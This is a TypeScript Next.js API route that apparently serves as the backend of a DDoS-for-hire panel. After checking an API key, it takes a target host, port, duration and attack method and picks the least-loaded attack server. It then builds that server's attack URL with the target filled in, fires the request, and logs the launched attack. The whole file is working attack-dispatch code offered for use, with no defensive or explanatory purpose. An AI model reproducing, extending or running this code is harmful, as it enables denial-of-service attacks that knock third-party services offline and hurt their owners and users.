import { NextRequest, NextResponse } from 'next/server';
import { webDb } from '@/lib/db/web';

async function handleAttack(req: NextRequest, params: Record<string, string>) {
  const host = params.host?.trim();
  const port = params.port?.trim() || '80';
  const timeStr = params.time?.trim();
  const methodName = params.method?.trim();

  if (!host || !timeStr || !methodName) {
    return NextResponse.json({ error: 'host, time, and method are required.' }, { status: 400 });
  }

  const attackTime = parseInt(timeStr, 10);
  if (isNaN(attackTime) || attackTime <= 0) {
    return NextResponse.json({ error: 'Invalid attack time.' }, { status: 400 });
  }

  const now = Math.floor(Date.now() / 1000);

  // Select API server
  const apiServers = await webDb.api.findMany();

  const matchingServers = apiServers.filter((s) => {
    const serverMethods = s.methods.split(',').map((m: string) => m.trim().toUpperCase());
    return serverMethods.includes(methodName.toUpperCase());
  });

  if (matchingServers.length === 0) {
    return NextResponse.json({ error: 'No API server supports the selected method.' }, { status: 400 });
  }

  let bestServer = matchingServers[0];
  let lowestActive = Infinity;

  for (const server of matchingServers) {
    const activeOnServer = await webDb.logs.count({
      where: {
        stopped: 0,
        handler: server.name,
        time: { gt: 0 },
      },
    });
    const available = server.slots - activeOnServer;
    if (available > 0 && activeOnServer < lowestActive) {
      lowestActive = activeOnServer;
      bestServer = server;
    }
  }

  if (lowestActive === Infinity) {
    return NextResponse.json({ error: 'All API servers are at full capacity.' }, { status: 429 });
  }

  const apiServer = bestServer;

  // Build attack URL
  let attackUrl = apiServer.api
    .replace(/\[host\]/gi, host)
    .replace(/\[port\]/gi, port)
    .replace(/\[time\]/gi, String(attackTime))
    .replace(/\[method\]/gi, methodName);

  // Send attack to the API server
  let attackSuccess = false;
  try {
    const attackRes = await fetch(attackUrl, {
      method: 'GET',
      signal: AbortSignal.timeout(10000),
    });
    attackSuccess = attackRes.ok;
  } catch (err) {
    console.error('External attack dispatch failed:', err);
  }

  // Log the attack
  await webDb.logs.create({
    data: {
      user: 'api',
      ip: host,
      time: attackTime,
      method: methodName,
      postdata: port,
      mode: 'api',
      ratelimit: '0',
      cookie: '0',
      date: now,
      chart: new Date(now * 1000).toISOString().slice(0, 19).replace('T', ' '),
      stopped: 0,
      handler: apiServer.name,
      origin: 'api',
    },
  });

  if (!attackSuccess) {
    return NextResponse.json({
      status: 'logged',
      message: 'Attack was logged but the API server may be unreachable.',
    }, { status: 500 });
  }

  return NextResponse.json({
    status: 'success',
    message: `Attack launched on ${host}:${port} for ${attackTime}s using ${methodName}.`,
    server: apiServer.name,
  });
}

export async function GET(req: NextRequest): Promise<NextResponse> {
  try {
    const { searchParams } = new URL(req.url);
    const key = searchParams.get('key')?.trim();

    if (!key) {
      return NextResponse.json({ error: 'API key is required.' }, { status: 401 });
    }

    const settings = await webDb.settings.findFirst({
      where: { sitename: { not: '' } },
      select: { key: true },
    });

    if (!settings || settings.key !== key) {
      return NextResponse.json({ error: 'Invalid API key.' }, { status: 403 });
    }

    const params: Record<string, string> = {};
    searchParams.forEach((value, name) => {
      params[name] = value;
    });

    return handleAttack(req, params);
  } catch (error) {
    console.error('External GET error:', error);
    return NextResponse.json({ error: 'Failed to process attack request.' }, { status: 500 });
  }
}

export async function POST(req: NextRequest): Promise<NextResponse> {
  try {
    let key: string | null = null;
    let params: Record<string, string> = {};

    const contentType = req.headers.get('content-type') || '';

    if (contentType.includes('application/json')) {
      const body = await req.json();
      key = body.key?.trim();
      params = body;
    } else {
      const formData = await req.formData();
      key = (formData.get('key') as string)?.trim();
      formData.forEach((value, name) => {
        params[name] = value as string;
      });
    }

    if (!key) {
      return NextResponse.json({ error: 'API key is required.' }, { status: 401 });
    }

    const settings = await webDb.settings.findFirst({
      where: { sitename: { not: '' } },
      select: { key: true },
    });

    if (!settings || settings.key !== key) {
      return NextResponse.json({ error: 'Invalid API key.' }, { status: 403 });
    }

    return handleAttack(req, params);
  } catch (error) {
    console.error('External POST error:', error);
    return NextResponse.json({ error: 'Failed to process attack request.' }, { status: 500 });
  }
}